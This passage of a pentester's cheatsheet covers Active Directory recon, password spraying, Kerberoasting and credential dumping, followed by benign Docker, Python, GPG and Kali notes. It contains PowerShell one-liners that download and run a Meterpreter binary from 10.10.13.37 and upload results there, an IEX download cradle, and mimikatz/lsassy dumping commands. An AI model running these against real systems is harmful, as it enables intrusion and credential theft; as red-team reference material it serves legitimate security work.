* [github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)

```
$ curl -L https://github.com/Kevin-Robertson/Inveigh/raw/master/Inveigh.ps1 > inveigh.ps1
PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y –NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
```

* [github.com/Kevin-Robertson/InveighZero](https://github.com/Kevin-Robertson/InveighZero)
* [github.com/Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection)

```
$ curl -L https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.0_x64/Inveigh.exe > inveigh.exe
PS > .\inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y
```

##### DHCPv6

mitm6.py:

* [blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
* [intrinium.com/mitm6-pen-testing/](https://intrinium.com/mitm6-pen-testing/)
* [github.com/fox-it/mitm6](https://github.com/fox-it/mitm6)

```
$ git clone https://github.com/fox-it/mitm6
$ python3 setup.py install
$ mitm6.py -i eth0
```



### Ping Sweep

Bash:

```
root@kali:$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 $NET.$i > /dev/null && echo "$NET.$i" |tee -a hosts/pingsweep.txt &); done
Or
root@kali:$ NET="0.0.0"; for i in $(seq 1 254); do (ping -c1 -W1 "$NET.$i" |grep 'bytes from' |cut -d' ' -f4 |cut -d':' -f1 |tee -a hosts/pingsweep.txt &); done

root@kali:$ sort -u -t'.' -k4,4n hosts/pingsweep.txt > hosts/targets.txt && rm hosts/pingsweep.txt
```

Nmap:

```
root@kali:$ nmap -n -sn -iL subnets/ranges.txt -oA hosts/pingsweep -PE
root@kali:$ grep 'Up' hosts/pingsweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > hosts/targets.txt
```



### RMI Sweep

Remote Management Interfaces:

* 22 -- SSH
* 80 -- HTTP
* 443 -- SSL/TLS
* 3389 -- RDP
* 2222 -- SSH?
* 5985 -- WinRM (HTTP)
* 5986 -- WinRM (HTTPS)

Nmap:

```
root@kali:$ nmap -n -Pn -iL subnets/ranges.txt -oA hosts/rmisweep -p22,80,443,3389,2222,5985,5986 [--min-rate 1280 --min-hostgroup 256]
root@kali:$ grep 'open' hosts/rmisweep.gnmap |cut -d' ' -f2 |sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n >> hosts/targets.txt
```

`Invoke-Portscan.ps1`:

* [github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1)
* [powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Portscan/)

```
$ curl -L https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1 > portscan.ps1
PS > Invoke-Portscan -Hosts 127.0.0.1/24 -T 4 -TopPorts 25 -oA localnet
```




## Services



### Nmap XML Parsers

`parsenmap.rb`:

```
root@kali:$ git clone https://github.com/R3dy/parsenmap-rb ~/tools/parsenmap-rb && cd ~/tools/parsenmap-rb
root@kali:$ bundle install && ln -s ~/tools/parsenmap-rb/parsenmap.rb /usr/local/bin/parsenmap.rb && cd -
root@kali:$ parsenmap.rb --help
```

* [github.com/R3dy/parsenmap](https://github.com/R3dy/parsenmap)

`nmaptocsv`:

```
root@kali:$ git clone https://github.com/maaaaz/nmaptocsv ~/tools/nmaptocsv && cd ~/tools/nmaptocsv
root@kali:$ python3 -m pip install -r requirements.txt csvkit && ln -s ~/tools/nmaptocsv/nmaptocsv.py /usr/local/bin/nmaptocsv.py && cd -
root@kali:$ nmaptocsv.py --help
```

* [github.com/maaaaz/nmaptocsv](https://github.com/maaaaz/nmaptocsv)

`parsenmap.py`:

```
root@kali:$ wget https://github.com/snovvcrash/cheatsheets/raw/master/tools/parsenmap.py -O ~/tools/parsenmap-py/parsenmap.py && chmod +x ~/tools/parsenmap-py/parsenmap.py
root@kali:$ ln -s ~/tools/parsenmap-py/parsenmap.py /usr/local/bin/parsenmap.py
```

* [github.com/snovvcrash/cheatsheets/blob/master/tools/parsenmap.py](https://github.com/snovvcrash/cheatsheets/blob/master/tools/parsenmap.py)



### Ports (Quick)

Echo:

```
root@kali:$ IP="0.0.0.0"; for p in $(seq 1 65535); do (timeout 1 bash -c "echo '.' >/dev/tcp/$IP/$port && echo OPEN:$port" >> hosts/ports.txt &) 2>/dev/null; done
root@kali:$ sort -u -t':' -k1,1n hosts/ports.txt > hosts/echo-ports.txt && rm hosts/ports.txt
```

Nmap:

```
root@kali:$ nmap -n -Pn -iL hosts/targets.txt -oA services/?-top-ports [--top-ports ? -T4 --min-rate 1280 --min-hostgroup 256]
root@kali:$ grep 'open' services/?-top-ports.gnmap
root@kali:$ parsenmap.rb services/?-top-ports.xml
root@kali:$ nmaptocsv.py -x services/?-top-ports.xml -d',' -f ip-fqdn-port-protocol-service-version-os |csvlook -I

root@kali:$ nmap -n -Pn -iL hosts/targets.txt -oA services/quick-sweep -p22,25,53,80,443,445,1433,3306,3389,5800,5900,8080,8443 [-T4 --min-rate 1280 --min-hostgroup 256]
root@kali:$ grep 'open' services/quick-sweep.gnmap
root@kali:$ parsenmap.rb services/quick-sweep.xml
root@kali:$ nmaptocsv.py -x services/quick-sweep.xml -d',' -f ip-fqdn-port-protocol-service-version-os |csvlook -I
```



### Ports (Full)

```
root@kali:$ nmap -n -Pn -sV -sC -iL hosts/targets.txt -oA services/alltcp-versions -p0-65535 --min-rate 50000 --min-hostgroup 256
```

Define which NSE scripts ran:

```
root@kali:$ grep '|_' services/alltcp-versions.nmap |cut -d'_' -f2 |cut -d' ' -f1 |sort -u |grep ':'
```

Look at HTTP titles:

```
root@kali:$ grep -i 'http-title' services/alltcp-versions.nmap
```

Examine version scan:

```
root@kali:$ parsenmap.rb services/alltcp-versions.xml > services/alltcp-versions.csv
Or
nmaptocsv.py -x services/alltcp-versions.xml -d',' -f ip-fqdn-port-protocol-service-version-os > services/alltcp-versions.csv
```

Split version scan by service names:

```
root@kali:$ parsenmap.py -i services/alltcp-versions.xml
```



### AD Environment Names

Discover domain NetBIOS name:

```
PS > ([ADSI]"LDAP://megacorp.local").dc

PS > $DomainName = (Get-ADDomain).DNSRoot
PS > (Get-ADDomain -Server $DomainName).NetBIOSName
```

Discover DCs' FQDN names:

```
PS > nslookup -type=all _ldap._tcp.dc._msdcs.$env:userdnsdomain

PS > $ldapFilter = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))"
PS > $searcher = [ADSISearcher]$ldapFilter
PS > $searcher.FindAll()
PS > $searcher.FindAll() | ForEach-Object { $_.GetDirectoryEntry() }
Or
PS > ([ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))").FindAll() |ForEach-Object { $_.GetDirectoryEntry() }

PS > [System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().DomainControllers.Name

Cmd > nltest /dsgetdc:megacorp.local

PS > $DomainName = (Get-ADDomain).DNSRoot
PS > $AllDCs = Get-ADDomainController -Filter * -Server $DomainName | Select-Object Hostname,Ipv4address,isglobalcatalog,site,forest,operatingsystem

PS > $AllDCs = (Get-ADForest).GlobalCatalogs

PowerView3 > Get-DomainController | Select Name,IPAddress
```

Discover MS Exchnage servers' FQDN names:

* [github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSExchangeServers)

```
$ curl -L https://github.com/PyroTek3/PowerShell-AD-Recon/raw/master/Discover-PSMSExchangeServers > discover-exch.ps1
PS > Discover-PSMSExchangeServers | Select ServerName,Description | Tee-Object exch.txt
```


Discover MS SQL servers' FQDN names:

* [github.com/NetSPI/PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
* [github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers](https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Discover-PSMSSQLServers)

```
$ curl -L https://github.com/NetSPI/PowerUpSQL/raw/master/PowerUpSQL.ps1 > powerupsql.ps1
PS > Get-SQLInstanceDomain
PS > Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Threads 10 -UserName sa -Password 'Passw0rd!' -Verbose
PS > Invoke-SQLOSCmd -UserName sa -Password 'Passw0rd!' -Instance sqlsrv01.megacorp.local -Command whoami

$ curl -L https://github.com/PyroTek3/PowerShell-AD-Recon/raw/master/Discover-PSMSSQLServers > discover-mssql.ps1
PS > Discover-PSMSSQLServers | Select ServerName,Description | Tee-Object mssql.txt
```



### LHF Exploits & Checkers


#### BlueKeep

CVE-2019-0708.

```
msf5 > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
```


#### EternalBlue

CVE-2017-0144, MS17-010.

```
msf5 > use auxiliary/scanner/smb/smb_ms17_010
```


#### net_api

CVE-2008-4250, MS08-067.

```
msf5 > use exploit/windows/smb/ms08_067_netapi
```


#### SIGRed

CVE-2020-1350.

* [github.com/T13nn3s/CVE-2020-1350](https://github.com/T13nn3s/CVE-2020-1350)


#### Zerologon

CVE-2020-1472.

* [github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
* [github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
* [github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472](https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472)




## Tricks

Grep only numbers to get list of ports separated by comma:

```
root@kali:$ cat nmap/initial.nmap |egrep -o '^[0-9]{1,5}' |awk -F/ '{ print $1 }' |tr '\n' ','; echo
```

Fast port discovery (Masscan) + versions and NSE scripts (Nmap):

```
root@kali:$ masscan --rate=1000 -e tun0 -p0-65535,U:0-65535 127.0.0.1 > ports
root@kali:$ ports=`cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr "\n" ',' | sed 's/,$//'`
root@kali:$ nmap -n -Pn -sV -sC [-sT] [--reason] -oA nmap/output 127.0.0.1 -p$ports
root@kali:$ rm ports
```

Fast port discovery (Nmap) + versions and NSE scripts (Nmap):

```
root@kali:$ nmap -n -Pn --min-rate=1000 -T4 127.0.0.1 -p- -vvv | tee ports
root@kali:$ ports=`cat ports | grep '^[0-9]' | awk -F "/" '{print $1}' | tr "\n" ',' | sed 's/,$//'`
root@kali:$ nmap -n -Pn -sV -sC [-sT] [--reason] -oA nmap/output 127.0.0.1 -p$ports
root@kali:$ rm ports
```

Top TCP ports:

| Port  |            Service            |
|-------|-------------------------------|
|    21 | FTP                           |
|    22 | SSH                           |
|    23 | Telnet                        |
|    25 | SMTP                          |
|    53 | DNS                           |
|    80 | HTTP                          |
|    88 | KDC                           |
|   111 | SUNRPC                        |
|   135 | MSRPC                         |
|   137 | NetBIOS                       |
|   139 | SMB                           |
|   389 | LDAP                          |
|   443 | SSL/TLS                       |
|   445 | SMB                           |
|   464 | KPASSWD                       |
|   593 | HTTP RPC Endpoint Mapper      |
|   636 | LDAP over SSL/TLS             |
|   873 | RSYNC                         |
|  1099 | JavaRMI                       |
|  1433 | MSSQL                         |
|  1521 | Oracle                        |
|  2049 | NFS                           |
|  3268 | Microsoft Global Catalog      |
|  3269 | Microsoft Global Catalog      |
|  3306 | MySQL/MariaDB                 |
|  3389 | RDP                           |
|  4786 | Cisco Smart Install           |
|  5432 | PostgreSQL                    |
|  5555 | HP Data Protector             |
|  5900 | VNC                           |
|  5985 | WinRM                         |
|  5986 | WinRM over SSL/TLS            |
|  6379 | Redis                         |
|  8080 | HTTP                          |
|  8443 | SSL/TLS                       |
|  9389 | Active Directory Web Services |
|  9200 | Elasticsearch                 |
| 27017 | MongoDB                       |

Top UDP ports:

| Port |  Service   |
|------|------------|
|   53 | DNS        |
|   67 | DHCP       |
|   68 | DHCP       |
|   69 | TFTP       |
|   88 | KDC        |
|  123 | NTP        |
|  161 | SNMP       |
|  162 | SNMPTRAP   |
|  500 | IKE        |
| 3391 | RD Gateway |

```
$ sudo masscan --rate=500 --open -p22,80,443,U:161,U:500 -iL routes.txt --resume paused.conf >> alltcp.txt
$ mkdir services && for p in 21 22 23 25 53 80 88 111 135 137 139 161 389 443 445 464 500 593 636 873 1099 1433 1521 2049 3268 3269 3306 3389 4786 5432 5555 5900 5985 5986 6379 8080 9389 9200 27017; do grep "port $p/tcp" alltcp.txt | awk -F' ' '{print $6}' | sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > "services/port$p.txt"; done
```



### Nmap

Flag `-A`:

```
root@kali:$ nmap -A ... == nmap -sC -sV -O --traceroute ...
```

Enum WAF:

```
root@kali:$ nmap --script http-waf-detect 127.0.0.1 -p80
root@kali:$ nmap --script http-waf-fingerprint 127.0.0.1 -p80
+ wafw00f.py
```




## Generate Password List



### hashcat

Potentially valid users if got any, `John Doe` as an example:

```
root@kali:$ cat << EOF >> passwords.txt
johndoe
jdoe
j.doe
doe
EOF
```

Common usernames:

```
root@kali:$ cat << EOF >> passwords.txt
admin
administrator
root
guest
sa
changeme
password
EOF
```

Common patterns:

```
root@kali:$ cat << EOF >> passwords.txt
January
February
March
April
May
June
July
August
September
October
November
December
Autumn
Fall
Spring
Winter
Summer
password
Password
P@ssw0rd
secret
Secret
S3cret
EOF
```

Add year and exclamation point to the end of each password:

```
root@kali:$ for i in $(cat passwords.txt); do echo "${i}"; echo "${i}\!"; echo "${i}2020"; echo "${i}2020\!"; done > t
root@kali:$ cp t passwords.txt
```

Mutate the wordlist with hashcat rules:

```
root@kali:$ hashcat --force --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule |sort -u |awk 'length($0) > 7' > t
root@kali:$ cp t passwords.txt
```

Simple list for password spraying:

```
root@kali:$ cat << EOF >> passwords.txt
admin
root
changeme
Password
Password1
Password!
Password2020
Password2020!
Gfhjkm
Gfhjkm1
Gfhjkm!
Gfhjkm2020
Gfhjkm2020!
Megacorp
Megacorp1
Megacorp!
Megacorp2020
Megacorp2020!
EOF
```



### cewl

```
$ cewl -d 5 -m 5 -w passwords.txt --with-numbers --email_file emails.txt http://megacorp.local/somedir/logs/html/index.htm
```



### Tools


#### Bloodhound

##### Setup

```
$ sudo apt install neo4j
$ sudo neo4j console
...change default password at localhost:7474...
$ sudo neo4j start
$ wget https://github.com/BloodHoundAD/BloodHound/releases/latest
$ unzip BloodHound-linux-x64.zip && rm BloodHound-linux-x64.zip && cd BloodHound-linux-x64
$ sudo ./BloodHound --no-sandbox
Or
$ sudo chown root:root chrome-sandbox
$ sudo chmod 4755 chrome-sandbox
$ ./BloodHound
```

##### SharpHound.ps1

Collect graphs via `Ingestors/SharpHound.ps1`:

```
PS > Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup,LoggedOn -Domain MEGACORP.LOCAL -LDAPUser snovvcrash -LDAPPass 'Passw0rd!'
```

##### BloodHound.py

* [github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)

Collect graphs via `BloodHound.py` (with BloodHound running):

```
$ git clone https://github.com/fox-it/BloodHound.py ~/tools/BloodHound.py && cd ~/tools/BloodHound.py && python setup.py install && cd -
$ bloodhound-python -c All -u snovvcrash -p 'Passw0rd!' -d MEGACORP.LOCAL -ns 127.0.0.1
```

##### Cypher

* [hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)


#### Impacket

* [github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)

```
$ git clone https://github.com/SecureAuthCorp/impacket
$ sudo python -m pip install --upgrade .
```

```
$ lookupsid.py MEGACORP/s.freeside:'Passw0rd!'@127.0.0.1 20000

$ GetUserSPNs.py MEGACORP/s.freeside:'Passw0rd!' -dc-ip 127.0.0.1 -save
$ ./hashcat64.exe -m 13100 -a 0 -w 4 -O --session=snovvcrash hashes/asprep.txt seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule

$ GetNPUsers.py MEGACORP/ -dc-ip 127.0.0.1 -k -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile asprep.txt | tee GetNPUsers.log
$ cat GetNPUsers.log | grep -v 'Client not found in Kerberos database'
$ ./hashcat64.exe -m 18200 -a 0 -w 4 -O --session=snovvcrash hashes/asprep.txt seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
```


#### CrackMapExec

Install bleeding-edge:

```
$ git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec ~/tools/CrackMapExec && cd ~/tools/CrackMapExec
$ sudo python3 -m pip install pipenv
$ pipenv install && pipenv shell
(CrackMapExec) $ python setup.py install
(CrackMapExec) $ sudo ln -s /home/snovvcrash/.virtualenvs/CrackMapExec/bin/crackmapexec /usr/bin/CME
(CrackMapExec) $ CME smb 127.0.0.1 -u 'anonymous' -p '' -M spider_plus
```

Use:

```
$ CME smb 127.0.0.1
$ CME smb 127.0.0.1 -u anonymous -p '' --shares
$ CME smb 127.0.0.1 -u snovvcrash -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
$ CME smb 127.0.0.1 -u nullinux_users.txt -p 'Passw0rd!' --shares [--continue-on-success]
$ CME smb 127.0.0.1 -u snovvcrash -p 'Passw0rd!' --spider-folder 'E\$' --pattern s3cret
$ CME smb 127.0.0.1 -u j.doe -p 'Passw0rd!' -d 'CORP' --spider Users --pattern '.'
$ CME smb 127.0.0.1 -u snovvcrash -p '' --local-auth --sam
$ CME smb 127.0.0.1 -u snovvcrash -p '' -M mimikatz
$ CME smb 127.0.0.1 -u snovvcrash -p '' -M lsassy
```


#### Empire

* [github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
* [github.com/BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire)

```
$ git clone https://github.com/BC-SECURITY/Empire
$ sudo ./setup/install.sh
```


#### PowerView

* [www.harmj0y.net/blog/powershell/make-powerview-great-again/](https://www.harmj0y.net/blog/powershell/make-powerview-great-again/)
* [github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf](https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
* [gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
* [PowerView 2.0](https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerView/powerview.ps1)
* [PowerView 3.0 [dev]](https://github.com/PowerShellMafia/PowerSploit/raw/dev/Recon/PowerView.ps1)

```
$ curl -L https://github.com/PowerShellEmpire/PowerTools/raw/master/PowerView/powerview.ps1 > powerview2.ps1
$ curl -L https://github.com/PowerShellMafia/PowerSploit/raw/dev/Recon/PowerView.ps1 > powerview3.ps1
PowerView3 > Get-DomainComputer -Properties Name | Resolve-IPAddress
PowerView3 > Invoke-Kerberoast -OutputFormat Hashcat | fl
```


#### Seatbelt

* [github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt)
* [github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)



### One-liners

PowerShell ping sweep:

```
echo "[*] Scanning in progress...";1..254 |ForEach-Object {Get-WmiObject Win32_PingStatus -Filter "Address='10.10.100.$_' and Timeout=50 and ResolveAddressNames='false' and StatusCode=0" |select ProtocolAddress* |Out-File -Append -FilePath .\live_hosts.txt};echo "[+] Live hosts:"; Get-Content -Path .\live_hosts.txt | ? { $_ -match "10.10.100" }; echo "[*] Done.";del .\live_hosts.txt
```

PowerShell auto detect proxy, download file from remote HTTP server and run it:

```
$proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings").ProxyServer;$proxy=New-Object System.Net.WebProxy;$proxy.Address=$proxyAddr;$proxy.useDefaultCredentials=$true;$client=New-Object System.Net.WebClient;$client.Proxy=$proxy;$client.DownloadFile("http://10.10.13.37/met.exe","$env:userprofile\music\met.exe");$exec=New-Object -com shell.application;$exec.shellexecute("$env:userprofile\music\met.exe")
```

PowerShell manually set proxy and upload file to remote HTTP server:

```
$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.megacorp.local:3128",$true);$creds=New-Object Net.NetworkCredential('snovvcrash','Passw0rd!','megacorp.local');$creds=$creds.GetCredential("http://proxy.megacorp.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
```



### Unsorted

```
root@kali:$ kerbrute userenum -d MEGACORP.LOCAL --dc 127.0.0.1 /usr/share/seclists/Usernames/Names/names.txt -t 50
root@kali:$ kerbrute bruteuser -d MEGACORP.LOCAL --dc 127.0.0.1 /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt snovvcrash -t 50

PS > systeminfo
PS > whoami /priv (whoami /all)
PS > gci "$env:userprofile" -recurse -force -af |select fullname
PS > net user
PS > net user /domain
PS > net user j.doe /domain
PS > net accounts
PS > net accounts /domain
PS > net localgroup Administrators
PS > net group /domain
PS > net group "Domain admins" /domain
PS > net group "Enterprise admins" /domain
PS > cmdkey /list
PS > wmic product get name
PS > get-process
PS > tasklist /SVC
PS > net start
PS > netstat -ano | findstr LIST
PS > ipconfig /all
PS > route print
PS > dir -force c:\
PS > (wmic os get OSArchitecture)[2]
PS > [Environment]::Is64BitOperatingSystem
PS > $ExecutionContext.SessionState.LanguageMode

PS > powershell -NoP -sta -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).DownloadString('https://github.com/BloodHoundAD/BloodHound/raw/master/Ingestors/SharpHound.ps1');Invoke-Bloodhound -CollectionMethod All,GPOLocalGroup,LoggedOn"
```

Common AV process names:

| Process Name |          Vendor/Product          |
|--------------|----------------------------------|
| avp.exe      | Kaspersky Internet Security      |
| cpda.exe     | End Point Security (Check Point) |
| MsMpEng.exe  | Windows Defender                 |
| ntrtscan.exe | Trend Micro OfficeScan           |
| tmlisten.exe | Trend Micro OfficeScan           |

```
PS > gc .\100-hosts.txt | % {gwmi -Query "select * from Win32_Process" -ComputerName $_ | ? {$_.Caption -in "name1.exe","name2.exe"} | select ProcessName,PSComputerName}
```





# Reverse & PWN





## Ghidra

Download through Tor:

* [ghidra-sre.org/](https://ghidra-sre.org/)

Install:

```
$ mv /opt/tor-browser/Browser/Downloads/ghidra*.zip ~/tools
$ cd ~/tools && unzip ghidra*.zip && rm ghidra*.zip && mv ghidra* ghidra && cd -
$ sudo apt install openjdk-11-jdk
```





# Web

```
$ gobuster dir -u 'http://127.0.0.1' -w /usr/share/wordlists/dirbuster/directory-list[-lowercase]-2.3-medium.txt -x php,asp,aspx,jsp,ini,config,cfg,xml,htm,html,json,bak,txt -t 50 -a 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -s 200,204,301,302,307,401 -o gobuster/127.0.0.1
$ nikto -h http://127.0.0.1 -Cgidirs all
```





# Sublime Text




## Installation



### Linux

```
$ wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -
$ sudo apt install apt-transport-https -y
$ echo "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list
$ sudo apt update && sudo apt install sublime-text -y

$ wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add - && sudo apt install apt-transport-https -y && echo "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list && sudo apt update && sudo apt install sublime-text -y
```





# Git

Add SSH key to the ssh-agent:

```
$ eval "$(ssh-agent -s)"
$ ssh-add ~/.ssh/id_rsa
```

Test SSH key:

```
ssh -T git@github.com
```





# Docker

```
$ docker ps -a
$ docker stop `docker container ls -aq`
$ docker rm -v `docker container ls -aq -f status=exited`
$ docker rmi `docker images -aq`
$ docker start -ai <CONTAINER>
$ docker cp project/. <CONTAINER>:/root/project
$ docker run --rm -ith <HOSTNAME> --name <NAME> ubuntu bash
$ docker build -t <USERNAME>/<IMAGE> .
```




## Installation



### Linux


#### docker-engine

```
$ sudo apt install apt-transport-https ca-certificates curl gnupg-agent software-properties-common -y
$ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
[$ sudo apt-key fingerprint 0EBFCD88]
$ sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
(Or for Kali) $ echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list
$ sudo apt update
[$ apt-cache policy docker-ce]
$ sudo apt install docker-ce
[$ sudo systemctl status docker]
$ sudo usermod -aG docker ${USER}
relogin
[$ docker --rm run hello-world]
```


#### docker-compose

```
$ sudo curl -L "https://github.com/docker/compose/releases/download/1.25.3/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
$ sudo chmod +x /usr/local/bin/docker-compose
[$ sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose]
```





# Python




## Install/Update

```
$ sudo apt install software-properties-common -y
$ sudo add-apt-repository ppa:deadsnakes/ppa
$ sudo apt update && sudo apt install python3.7 -y

$ sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.6 1
$ sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.6 2
$ sudo update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.7 3
$ sudo update-alternatives --config python3

$ sudo apt install python[3]-pip -y
Or
$ wget https://bootstrap.pypa.io/get-pip.py
$ python[3] get-pip.py

$ sudo python3 -m pip install --upgrade pip
```




## pip



### freeze

```
$ pip freeze --local [-r requirements.txt] > requirements.txt
```




## venv

```
$ sudo apt install python3-venv
$ python3 -m venv venv
```




## virtualenv

```
$ sudo pip3 install virtualenv
$ virtualenv -p python3 venv
$ source venv/bin/activate
$ deactivate
```



### virtualenvwrapper

```
$ sudo pip3 install virtualenvwrapper
$ export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3
$ source /usr/local/bin/virtualenvwrapper.sh
(in ~/.zshrc)

$ mkvirtualenv env-name
$ workon
$ workon env-name
$ deactivate
$ rmvirtualenv env-name
```



### pipenv

```
$ sudo pip install pipenv
$ pipenv --python python3 install [package]

$ pipenv shell
^D

$ pipenv run python script.py
$ pipenv lock -r > requirements.txt
$ pipenv --venv
$ pipenv --rm
```

Workaround for `TypeError: 'module' object is not callable`:

```
$ pipenv --python python3 install pip==18.0
```




## Testing



### doctest

`doctest` imported:

```
$ python3 example.py [-v]
```

`doctest` **not** imported:

```
$ python3 -m doctest example.py [-v]
```




## Linting



### flake8

```
$ python3 -m flake8 --ignore W191,E127,E226,E265,E501 somefile.py
```



### pylint

```
$ python3 -m pylint -d C0111,C0122,C0330,W0312 --msg-template='{msg_id}:{line:3d},{column:2d}:{obj}:{msg}' somefile.py
```




## PyPI



### twine

```
$ python setup.py sdist bdist_wheel [--bdist-dir ~/temp/bdistwheel]
$ twine check dist/*
$ twine upload --repository-url https://test.pypi.org/legacy/ dist/*
$ twine upload dist/*
```




## Misc



### bpython

```
$ python3 -m pip install bpython
```





# GPG

List keychain:

```
$ gpg --list-keys
```

Gen key:

```
$ gpg --full-generate-key [--expert]
```

Gen revoke cert:

```
$ gpg --output revoke.asc --gen-revoke user@example.com
revoke.asc
```

Export user's public key:

```
$ gpg --armor --output user.pub --export user@example.com
user.pub
```

Import recipient's public key:

```
$ gpg --import recipient.pub
```

Sign and encrypt:

```
$ gpg -o/--output encrypted.txt.gpg -e/--encrypt -s/--sign -u/--local-user user1@example.com -r/--recipient user2@example.com plaintext.txt
encrypted.txt.gpg
```

List recipients:

```
$ gpg --list-only -v -d/--decrypt encrypted.txt.gpg
```

Verify signature:

```
$ gpg --verify signed.txt.gpg
$ gpg --verify signed.txt.sig signed.txt
```

Decrypt and verify:
```
$ gpg -o/--output decrypted.txt -d/--decrypt --try-secret-key user1@example.com encrypted.txt.gpg
$ gpg -o/--output decrypted.txt -d/--decrypt -u/--local-user user1@example.com -r/--recipient user2@example.com encrypted.txt.gpg
```

* [How to Use GPG Keys to Send Encrypted Messages](https://www.linode.com/docs/security/encryption/gpg-keys-to-send-encrypted-messages/)
* [Используем GPG для шифрования сообщений и файлов / Хабр](https://habr.com/ru/post/358182/)
* [Как пользоваться gpg: шифрование, расшифровка файлов и сообщений, подпись файлов и проверка подписи, управление ключами - HackWare.ru](https://hackware.ru/?p=8215)





# VirtualBox




## DHCP

```
Cmd > "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" dhcpserver add --netname intnet --ip 10.0.1.1 --netmask 255.255.255.0 --lowerip 10.0.1.101 --upperip 10.0.1.254 --enable
```




## Shared Folders

```
$ sudo usermod -aG vboxsf snovvcrash
$ sudo reboot
```





# Kali




## Configure

Mix settings list (both for hardware install and virtualization):

```
[VM] Disable screen lock (Power manager settings -> Display -> Display power manager -> OFF)
[VM] Configure networks (+ remember to configure VBox DHCP first)
[All] Update && Upgrade (+ change /etc/apt/sources.list to HTTPS if getting "403 Forbidden" because of the antivirus)
	$ sudo apt update && sudo upgrade -y
	$ sudo reboot
[VM] Install guest additions
	* Insert Guest Additions CD image and open terminal there
